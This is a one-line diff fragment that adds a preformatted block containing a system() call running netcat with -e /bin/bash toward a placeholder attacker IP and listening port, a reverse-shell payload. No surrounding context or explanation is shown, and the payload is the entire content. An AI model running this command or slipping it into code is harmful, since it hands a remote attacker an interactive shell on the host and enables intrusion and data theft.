@@ -1,0 +1,1 @@
+<pre>system('nc <ATTACKER_IP> <ATTACKER_LISTEN_PORT> -e /bin/bash')</pre>
